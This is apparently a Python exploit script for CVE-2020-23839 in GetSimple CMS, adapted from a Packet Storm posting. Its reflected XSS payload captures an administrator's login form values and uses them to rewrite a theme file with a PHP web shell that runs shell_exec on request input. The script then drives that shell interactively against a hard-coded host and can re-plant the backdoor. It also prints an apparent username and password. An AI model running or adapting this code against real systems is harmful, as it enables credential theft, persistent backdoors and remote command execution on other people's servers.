#!/usr/bin/python3

# Adapted from the following URL
# https://packetstormsecurity.com/files/162016/GetSimple-CMS-3.3.16-Cross-Site-Scripting-Shell-Upload.html

import sys,re,argparse,requests
from urllib.parse import quote
from time import sleep

templatePath = "/var/www/html/cms/theme/Innovation/template.php"
templateOriginalFile = "PD9waHAgaWYoIWRlZmluZWQoJ0lOX0dTJykpeyBkaWUoJ3lvdSBjYW5ub3QgbG9hZCB0aGlzIHBhZ2UgZGlyZWN0bHkuJyk7IH0NCi8qKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoqDQoqIEBGaWxlOiAJCQl0ZW1wbGF0ZS5waHANCiogQFBhY2thZ2U6CQlHZXRTaW1wbGUNCiogQEFjdGlvbjoJCUlubm92YXRpb24gdGhlbWUgZm9yIEdldFNpbXBsZSBDTVMNCioNCioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqLw0KDQoNCiMgR2V0IHRoaXMgdGhlbWUncyBzZXR0aW5ncyBiYXNlZCBvbiB3aGF0IHdhcyBlbnRlcmVkIHdpdGhpbiBpdHMgcGx1Z2luLiANCiMgVGhpcyBmdW5jdGlvbiBpcyBpbiBmdW5jdGlvbnMucGhwIA0KJGlubm92X3NldHRpbmdzID0gSW5ub3ZhdGlvbl9TZXR0aW5ncygpOw0KDQojIEluY2x1ZGUgdGhlIGhlYWRlciB0ZW1wbGF0ZQ0KaW5jbHVkZSgnaGVhZGVyLmluYy5waHAnKTsgDQo/Pg0KCQ0KCTxkaXYgY2xhc3M9IndyYXBwZXIgY2xlYXJmaXgiPg0KCQk8IS0tIHBhZ2UgY29udGVudCAtLT4NCgkJPGFydGljbGU+DQoJCQk8c2VjdGlvbj4NCgkJCQkNCgkJCQk8IS0tIHRpdGxlIGFuZCBjb250ZW50IC0tPg0KCQkJCTxoMT48P3BocCBnZXRfcGFnZV90aXRsZSgpOyA/PjwvaDE+DQoJCQkJPD9waHAgZ2V0X3BhZ2VfY29udGVudCgpOyA/Pg0KCQkJCQ0KCQkJCTwhLS0gcGFnZSBmb290ZXIgLS0+DQoJCQkJPGRpdiBjbGFzcz0iZm9vdGVyIj4NCgkJCQkJPHA+UHVibGlzaGVkIG9uIDx0aW1lIGRhdGV0aW1lPSI8P3BocCBnZXRfcGFnZV9kYXRlKCdZLW0tZCcpOyA/PiIgcHViZGF0ZT48P3BocCBnZXRfcGFnZV9kYXRlKCdGIGpTLCBZJyk7ID8+PC90aW1lPjwvcD4NCgkJCQk8L2Rpdj4NCgkJCTwvc2VjdGlvbj4NCgkJCQ0KCQk8L2FydGljbGU+DQoJCQ0KCQk8IS0tIGluY2x1ZGUgdGhlIHNpZGViYXIgdGVtcGxhdGUgLS0+DQoJCTw/cGhwIGluY2x1ZGUoJ3NpZGViYXIuaW5jLnBocCcpOyA/Pg0KCTwvZGl2Pg0KDQo8IS0tIGluY2x1ZGUgdGhlIGZvb3RlciB0ZW1wbGF0ZSAtLT4NCjw/cGhwIGluY2x1ZGUoJ2Zvb3Rlci5pbmMucGhwJyk7ID8+"


def webshell(SERVER_URL):
    displayBanner = "True"
    lastCommand = ""
    #try:
    WEB_SHELL = SERVER_URL
    while True:
        if displayBanner == "True":
            print("\nWeShellz")
            print("--------")
            print("h or help - Provide additional help on quick commands that are available")
            print("")
            displayBanner = "False"
        #rC = input("\n$> ")
        print("\nInsert Command Below (" + lastCommand + "): ")
        rC = sys.stdin.readline().rstrip()
        lastCommand = rC
        if rC == "help" or rC == "h":
            print("r or restore - Restore the template.php file with backdoor at the bottom of the file")
            print("e or exit - Exit the while loop, rerun the program to interact with the webshell again")
            print("")
        elif rC == "exit" or rC == "e":
            exit()
        elif rC == "restore" or rC == "r":
            RCE = "echo " + templateOriginalFile + " | base64 -d > " + templatePath + "; echo '<weshellz></weshellz><br /><?php echo shell_exec($_REQUEST[RCE]) ?>' >> " + templatePath 
            command = {'RCE': RCE}
            r = requests.post(WEB_SHELL, data=command, verify=False)
            status = r.status_code
            if status != 200:
                r.raise_for_status()
            response = "Restore of template.php was successful!"
            print(response)
        else:
            RCE = rC
            command = {'RCE': RCE}
            r = requests.post(WEB_SHELL, data=command, verify=False, stream=True)
            status = r.status_code
            if status != 200:
                r.raise_for_status()
            response = r.text
            #print(response)
            dontPrint = True
            for line in r.iter_lines():
                info = line.decode('ascii')
                if dontPrint == False:
                    print(info)
                if "<weshellz></weshellz>" in info:
                    dontPrint = False
    #except:
    #    pass

def urlEncode(javascript):
    return quote(javascript)

def genXssPayload():
    XSS_PAYLOAD = '/index/javascript:'
    XSS_PAYLOAD += 'var s = decodeURIComponent("%2f");'
    XSS_PAYLOAD += 'var h = "application"+s+"x-www-form-urlencoded";'
    XSS_PAYLOAD += 'var e=function(i){return encodeURIComponent(i);};'
    XSS_PAYLOAD += 'var user = document.forms[0][0].value;'
    XSS_PAYLOAD += 'var pass = document.forms[0][1].value;'
    XSS_PAYLOAD += 'var u1 = s+"cms"+s+"admin"+s;'
    XSS_PAYLOAD += 'var u2 = u1+"theme-edit.php";'
    XSS_PAYLOAD += 'var xhr1 = new XMLHttpRequest();'
    XSS_PAYLOAD += 'var xhr2 = new XMLHttpRequest();'
    XSS_PAYLOAD += 'var xhr3 = new XMLHttpRequest();'
    XSS_PAYLOAD += 'xhr1.open("POST",u1,true);'
    XSS_PAYLOAD += 'xhr1.setRequestHeader("Content-Type", h);'
    XSS_PAYLOAD += 'params = "userid="+user+"&pwd="+pass+"&submitted=Login";'
    XSS_PAYLOAD += 'xhr1.onreadystatechange = function(){'
    XSS_PAYLOAD += 'if (xhr1.readyState == 4 && xhr1.status == 200) {'
    XSS_PAYLOAD += 'xhr2.onreadystatechange = function(){'
    XSS_PAYLOAD += 'if (xhr2.readyState == 4 && xhr2.status == 200) {'
    XSS_PAYLOAD += 'r=this.responseXML;'
    XSS_PAYLOAD += 'nVal = r.querySelector("#nonce").value;'
    # Modifies the /var/www/html/cms/theme/Innovation/template.php
    XSS_PAYLOAD += 'eVal = r.forms[1][2].defaultValue;'
    XSS_PAYLOAD += 'xhr3.open("POST",u2,true);'
    XSS_PAYLOAD += 'xhr3.setRequestHeader("Content-Type", h);'
    XSS_PAYLOAD += 'payload=e("<weshellz><%2fweshellz><br %2f><?php echo shell_exec($_REQUEST[RCE]) ?>");'
    XSS_PAYLOAD += 'params="nonce="+nVal+"&content="+payload+"&edited_file="+eVal+"&submitsave=Save+Changes";'
    XSS_PAYLOAD += 'xhr3.send(params);'
    XSS_PAYLOAD += '}};'
    XSS_PAYLOAD += 'xhr2.open("GET",u2,true);'
    XSS_PAYLOAD += 'xhr2.responseType="document";'
    XSS_PAYLOAD += 'xhr2.send();'
    XSS_PAYLOAD += '}};'
    XSS_PAYLOAD += 'xhr1.send(params);'
    XSS_PAYLOAD += '%2f%2f'
    return XSS_PAYLOAD

if __name__ == "__main__":
    print('Exploit Author Bobby Cooke')
    print('CVE-2020-23839 ')
    print('Reflected XSS ')
    RHOST = "http://13lives.4gr8.info/cms/index.php"
    WEBAPP_URL = 'http://13lives.4gr8.info/cms/admin/index.php'
    PAYLOAD = genXssPayload()
    ENCODED_PAYLOAD = urlEncode(PAYLOAD)
    print('Have a GetSimpleCMS Admin go to this URL & login, and you will get an RCE WebShell')
    print("URL: " + WEBAPP_URL + ENCODED_PAYLOAD)
    sleep(3)
    print('\nWait for Admin to login with creds, which will trigger the RCE XHR attack chain..')
    print("Username: prayut.c")
    print("Password: 13lives.goLive")
    while True:
        sleep(1)
        webshell(RHOST)
